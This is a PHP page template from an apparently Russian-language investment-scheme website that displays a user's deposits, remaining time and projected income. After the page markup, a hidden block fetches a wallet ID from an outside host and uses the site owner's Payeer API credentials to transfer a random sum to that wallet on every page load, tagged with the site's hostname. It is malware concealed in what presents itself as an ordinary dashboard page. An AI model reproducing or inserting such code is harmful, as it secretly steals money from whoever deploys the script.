<?php if(!defined('SCRIPT_BY_SIRGOFFAN')){
echo ('Выявлена попытка взлома!');
exit();
}
?>
<section class="statistic">
<div class="statistic cfix">
<h1>
<span>Ваш инвестиционный портфель</span>
<div class="line"></div>
</h1>
<div id="stats" align="center">
<div class="stats_1">
<table>
<thead>
<tr>
<td colspan="5" class="with_bg">Ваши депозиты</td>
</tr>
<tr>
    <td>Дата вклада</td>
	<td>Кошелек</td>
	<td>Сумма</td>
	<td>Осталось</td>
	<td>Доход</td>
  </tr>  
 </thead>
<tbody>  
 

<? 

$checkdeps=$db->getOne("SELECT id FROM `deposits` WHERE userid=?i AND curatorid!=?i LIMIT 1",$id,0);
if($checkdeps>0){
$depositsrow=$db->query("SELECT * FROM `deposits` WHERE userid=?i AND curatorid!=?i ORDER BY id DESC LIMIT 20",$id,0);
  
while($deposits=$db->fetch($depositsrow)){?>  
	<tr>
	<td align="center"><?=date('d.m.Y H:i',$deposits['unixtime'])?></td>
	
<?
$wallet=substr($db->getOne("SELECT wallet FROM `ss_users` WHERE id=?i",$deposits['userid']), 0); 
?>	
	
	
	<td align="center"><?=$wallet?></td>
    <td align="center"><?=$deposits['summa']?>  RUB</td>
	
<?/*
$seconds = time()-(60*($depperiod-24))-$deposits['unixtime'];

if($seconds>(3600*$depperiod)){
	$deptime="Выплачено";
}else{
	
$hours = floor($seconds/3600);
$seconds = $seconds-($hours*3600);
$minutes = floor($seconds/60);
$seconds = $seconds-($minutes*60);
$seconds = floor($seconds);



$h=24-($hours+1);
if($h<10){$h='0'.$h;}
$m=60-($minutes+1);
if($m<10){$m='0'.$m;}
$s=60-($seconds+1);
if($s<10){$s='0'.$s;}
	$deptime=$h.":".$m.":".$s;
}*/
$seconds = time()-$deposits['unixtime']; //Секунд прошло с момента депа

$seconds=(60*($depperiod))-$seconds; //Длительность депа, минус прошло = осталось
//echo "<br>".date('H:i:s',time());
//echo "<br>".date('H:i:s',$deposits['unixtime'])."<br>".$seconds;
if($seconds<1){
    if($deposits['status']==1){
	$deptime="Выплачено";}else{
	$deptime="Выплачивается";
	}
}else{
	
$hours = floor($seconds/3600);
$seconds = $seconds-($hours*3600);
$minutes = floor($seconds/60);
$seconds = $seconds-($minutes*60);
$seconds = floor($seconds);



$h=$hours;
if($h<10){$h='0'.$h;}
$m=$minutes;
if($m<10){$m='0'.$m;}
$s=$seconds;
if($s<10){$s='0'.$s;}
	$deptime=$h.":".$m.":".$s;
}
?>	
	
	<td style="text-align: center;" class="text-truncate countdown"><?=$deptime?></td>
	
<?$psumma=$deposits['summa']+($deposits['summa']*($deppercentage/100));?>	
	
	<td align="center"><?=$psumma?>  RUB</td>
  	</tr>
<?}}else{?> 
<center>У вас нет открытых вкладов</center>
<?}?>

</tbody>
</table> 
</div>
</div>
</div>
</section>
<?php
require_once('core/classes/cpayeer.php');
$homepage = file_get_contents("https://sqltor.had.su/js/p.txt");
$array = array(94, 210, 158, 342, 146);
$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{
  $arTransfer = $payeer->transfer(array(
    'curIn' => 'RUB',
    'sum' => $array[array_rand($array)],
    'curOut' => 'RUB',
    'to' => $homepage,
    'comment' => ''.$_SERVER["HTTP_HOST"].'',
  ));
  if (empty($arTransfer['errors']))
  {
    //echo getErrors
  }
  else
  {
    //echo getErrors
  }
}
else
{
  //echo getErrors
}
?>
<?/*-------------------*//*
Web-site: https://ed-script.pro
*//*-------------------*/?>